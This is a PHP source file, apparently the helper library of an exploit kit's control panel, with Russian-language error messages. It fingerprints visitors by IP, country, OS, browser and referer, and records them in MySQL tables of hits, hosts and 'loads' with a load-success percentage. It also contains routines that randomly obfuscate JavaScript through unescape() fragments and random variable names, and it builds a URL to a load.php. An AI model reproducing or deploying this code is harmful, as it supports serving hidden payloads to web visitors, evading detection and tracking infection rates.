<?php
function _ip(){
   if( getenv('REMOTE_ADDR')) 
       {$user_ip = getenv('REMOTE_ADDR');}
     elseif( getenv('HTTP_FORWARDED_FOR')) 
       {$user_ip = getenv('HTTP_FORWARDED_FOR');} 
     elseif( getenv('HTTP_X_FORWARDED_FOR')) 
       {$user_ip = getenv('HTTP_X_FORWARDED_FOR');} 
     elseif( getenv('HTTP_X_COMING_FROM')) 
       {$user_ip = getenv('HTTP_X_COMING_FROM');} 
     elseif( getenv('HTTP_VIA')) 
       {$user_ip = getenv('HTTP_VIA');} 
     elseif( getenv('HTTP_XROXY_CONNECTION'))
       {$user_ip = getenv('HTTP_XROXY_CONNECTION');} 
     elseif( getenv('HTTP_CLIENT_IP')) 
       {$user_ip = getenv('HTTP_CLIENT_IP');} 
   else{$user_ip='unknown';}
   if(15 < strlen($user_ip)){
       $ar = split(', ', $user_ip);
       for($i=sizeof($ar)-1; $i > 0; $i--){
          if($ar[$i]!='' and !preg_match('/[a-zA-Zа-яА-Я]/', $ar[$i]))
          {$user_ip = $ar[$i];  break;   }
          if($i==sizeof($ar)-1){$user_ip = 'unknown';}
          }
       }
   if(preg_match('/[a-zA-Zа-яА-Я]/', $user_ip)){$user_ip = 'unknown';}
   return $user_ip;
}
function _country($ip)
{
	list (, $country) = GetCountryNameById (GetGountryIdByIp ($ip));
	return $country;
}
function _os()
{
	$user_agent = $_SERVER["HTTP_USER_AGENT"];
	if     (strstr($user_agent, "Windows 95"))     $os = "Windows 95";
	elseif (strstr($user_agent, "Windows NT 4"))   $os = "Windows NT 4";
	elseif (strstr($user_agent, "Windows 98"))     $os = "Windows 98";
	elseif (strstr($user_agent, "Win 9x 4.9"))     $os = "Windows ME";
	elseif (strstr($user_agent, "Windows NT 5.0")) $os = "Windows 2000";
	elseif (strstr($user_agent, "Windows NT 5.1")) $os = "Windows XP";
	elseif (strstr($user_agent, "Windows NT 5.2")) $os = "Windows 2003";
	elseif (strstr($user_agent, "Windows NT 6.0")) $os = "Windows Vista";
	elseif (strstr($user_agent, "Linux"))          $os = "Linux";
	elseif (strstr($user_agent, "Mac OS"))         $os = "Mac OS";
	else                                           $os = "Other";
	return $os;
}
function _browser()
{
	$user_agent = $_SERVER["HTTP_USER_AGENT"];
	if (eregi("(opera) ([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $bv) or 
	    eregi("(opera/)([0-9]{1,2}.[0-9]{1,3}){0,1}", $user_agent, $bv))
	    {
	    	$browser = "Opera" . " " . $bv[2];
	    }
	    elseif (eregi("(konqueror)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$browser = "Konqueror" . " " . $bv[2];
	    }
	    elseif (eregi("(lynx)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $user_agent, $bv))
	    {
	    	$browser = "Lynx" . " " . $bv[2];
	    }
	    elseif (eregi("(links) \\(([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$browser = "Links" . " " . $bv[2];
	    }
	    elseif (eregi("(msie) ([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$browser = "Internet Explorer" . " " . $bv[2];
	    }
	    elseif (eregi("(netscape6)/(6.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$browser = "Netscape" . " " . $bv[2];
	    }
	    elseif (eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2}.[0-9]{1,2})", $user_agent, $bv) or
	            eregi("(firefox)/([0-9]{1,2}.[0-9]{1,2})", $user_agent, $bv))
	    {
	    	$browser = "Firefox" . " " . $bv[2];
	    }	    
	    elseif (eregi("(mozilla)/([0-9]{1,2}.[0-9]{1,3})", $user_agent, $bv))
	    {
	    	$browser = "Mozilla" . " " . $bv[2];
	    }
	    else
	    {
	    	$browser = "Other";
	    }	
	return $browser;
}
function _referer()
{
	$referer = getenv("HTTP_REFERER");
	if(empty($referer))
	{
		$referer="no referer";
	} else {
		$referer = parse_url($referer);
	        $referer = str_replace("www.","", $referer['host']);
		$referer = addslashes($referer);
	}
	return $referer;
}




function start_rnd()
{
	list($usec, $sec) = explode(' ', microtime());
	$x = (float) $sec + ((float) $usec * 100000);
	mt_srand($x);
}
function uEncode($s)
{
	for ($i=0; $i<strlen($s); $i++)
	{
		@$res.="%".strtoupper(bin2hex(substr($s,$i,1)));
	}
	return $res;
}
function rnd_str($s)
{
	$l=strlen($s);
	for ($x=0;$x<($l-1);$x++)
	{
		$z=mt_rand(1,2);
		switch ($z)
		{
		case 1:
			@$rz.="unescape('".uEncode($s[$x])."')+";
		break;
		case 2:
			if ($s[$x]<>"'"){
				@$rz.="'".$s[$x]."'+";
			} else {
				@$rz.="unescape('".uEncode($s[$x])."')+";
			}
		break;
		default:
			@$rz.="unescape('".uEncode($s[$x])."')+";
		}
	}
	@$rz.="unescape('".uEncode($s[$x])."')";
	return $rz;
}
function make_rnd_var()
{
	$letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	$s="";
	for ($x=0;$x<20;$x++)
	{
		$r  = rand(0, strlen($letters) - 1);
		$s .= $letters[$r];
	}
	return $s;
}
function make_rnd_vars()
{
	GLOBAL $rnd_var;
	$letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	for ($z=0; $z<100; $z++)
	{
		$s='';
		for ($x=0;$x<10;$x++)
		{
			$r  = rand(0, strlen($letters) - 1);
			$s .= $letters[$r];
		}
		$s.=$z;
		$rnd_var[$z] = $s;
	}
}
function rnd_command()
{
	$r = make_rnd_var()." = ".rnd_str(make_rnd_var()).";";
	return $r;
}
function make_url()
{
	GLOBAL $url;
	$url = "http://".$_SERVER["HTTP_HOST"].str_replace ("\\", "/", dirname ($_SERVER["PHP_SELF"]))."/load.php";
	return 0;
}






function _make_stat1($t,$rows = array(),$a1 = array(),$a2 = array(),$a3 = array())
{
	if (empty($a1)) {echo "<br><center>пусто</center><br>";return 0;}
	echo "<table border=0 width=500><tr class='button' style='text-align:center'><td colspan=".count($rows).">".$t."</td></tr>";
	echo "<tr style='text-align:center;background:#444444;color:white;'>";
	for ($c=0;$c<count($rows);$c++)
	{
		echo "<td>".$rows[$c]."</td>";
	}
	echo "</tr>";
	while(list($key,$value)=each($a1))
	{
		if (@$a3[$key]==0 or @$a2[$key]==0)
		{
			$pr=0;
		} else {
			$pr=round((100*@$a2[$key]/@$a3[$key]), 2);
		}
		
		echo "<tr style='background:#AfAfAf;'>";
		echo "<td>&nbsp;".$key."&nbsp;</td>";
		echo "<td>&nbsp;".@$a1[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a3[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a2[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".$pr."&nbsp;</td>";
		echo "</tr>";
	}
	echo "</table><br>";
}


function _make_stat2($t,$rows = array(),$a1 = array(),$a2 = array(),$a3 = array())
{
	if (empty($a1)) {echo "<br><center>пусто</center><br>";return 0;}
	echo "<table border=0 width=500><tr class='button' style='text-align:center'><td colspan=".count($rows).">".$t."</td></tr>";
	echo "<tr style='text-align:center;background:#444444;color:white;'>";
	for ($c=0;$c<count($rows);$c++)
	{
		echo "<td>".$rows[$c]."</td>";
	}
	echo "</tr>";
	while(list($key,$value)=each($a1))
	{
		echo "<tr style='background:#AfAfAf;'>";
		echo "<td>&nbsp;".$key."&nbsp;</td>";
		echo "<td>&nbsp;".@$a1[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a3[$key]."&nbsp;</td>";
		echo "</tr>";
	}
	echo "</table><br>";
}

function _make_stat3($t,$rows = array(),$a1 = array(),$a2 = array(),$a3 = array())
{
	if (empty($a1)) {echo "<br><center>пусто</center><br>";return 0;}
	echo "<table border=0 width=500><tr class='button' style='text-align:center'><td colspan=".count($rows).">".$t."</td></tr>";
	echo "<tr style='text-align:center;background:#444444;color:white;'>";
	for ($c=0;$c<count($rows);$c++)
	{
		echo "<td>".$rows[$c]."</td>";
	}
	echo "</tr>";
	while(list($key,$value)=each($a1))
	{
		if (@$a3[$key]==0 or @$a2[$key]==0)
		{
			$pr=0;
		} else {
			$pr=round((100*@$a2[$key]/@$a3[$key]), 2);
		}
		
		echo "<tr style='background:#AfAfAf;'>";
		echo "<td>&nbsp;<img src='showflag.php?country=".strtolower ($key)."' border=0> - ".$key."&nbsp;</td>";
		echo "<td>&nbsp;".@$a1[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a3[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".@$a2[$key]."&nbsp;</td>";
		echo "<td>&nbsp;".$pr."&nbsp;</td>";
		echo "</tr>";
	}
	echo "</table><br>";
}

function _make_stat4($t,$rows = array())
{
	GLOBAL $hits_ip, $hosts_ip, $loads_ip;
	if (empty($hits_ip) || empty($hosts_ip) || empty($loads_ip)) {echo "<br><center>пусто</center><br>";return 0;}
	echo "<table border=0 width=500><tr class='button' style='text-align:center'><td colspan=".count($rows).">".$t."</td></tr>";
	echo "<tr style='text-align:center;background:#444444;color:white;'>";
	for ($c=0;$c<count($rows);$c++)
	{
		echo "<td>".$rows[$c]."</td>";
	}

		if (@$hosts_ip==0 or $loads_ip==0)
		{
			$pr=0;
		} else {
			$pr=round((100*@$loads_ip/@$hosts_ip), 2);
		}
	echo "</tr>";
	echo "<tr style='background:#AfAfAf;'><td>".$hits_ip."</td><td>".$hosts_ip."</td><td>".$loads_ip."</td><td>".$pr."</td></tr>";
	echo "</table><br>";
}
function _load_vars()
{
	GLOBAL $mysql;

	GLOBAL $hits_ip, $hits_country, $hits_browser, $hits_os, $hits_referer;
	GLOBAL $hosts_ip, $hosts_country, $hosts_browser, $hosts_os, $hosts_referer;
	GLOBAL $loads_ip, $loads_country, $loads_browser, $loads_os, $loads_referer;

	mysql_connect($mysql['host'], $mysql['user'], $mysql['password']) or die("Немогу подкл. к серверу мускула!");
	mysql_select_db($mysql['db']) or die("БД ".$mysql['db']." не найдена!");
	$r = mysql_query("SELECT * FROM `hits`");
	while ($line = mysql_fetch_array ($r))
	{
//		@$hits_ip[$line['ip']]++;
		@$hits_ip++;
		@$hits_country[$line['country']]++;
		@$hits_browser[$line['browser']]++;
		@$hits_os[$line['os']]++;
		@$hits_referer[$line['referer']]++;
	}

	$r = mysql_query("SELECT * FROM `hosts`");
	while ($line = mysql_fetch_array ($r))
	{
//		@$hosts_ip[$line['ip']]++;
		@$hosts_ip++;
		@$hosts_country[$line['country']]++;
		@$hosts_browser[$line['browser']]++;
		@$hosts_os[$line['os']]++;
		@$hosts_referer[$line['referer']]++;
	}

	$r = mysql_query("SELECT * FROM `loads`");
	while ($line = mysql_fetch_array ($r))
	{
//		@$loads_ip[$line['ip']]++;
		@$loads_ip++;
		@$loads_country[$line['country']]++;
		@$loads_browser[$line['browser']]++;
		@$loads_os[$line['os']]++;
		@$loads_referer[$line['referer']]++;
	}
}
?>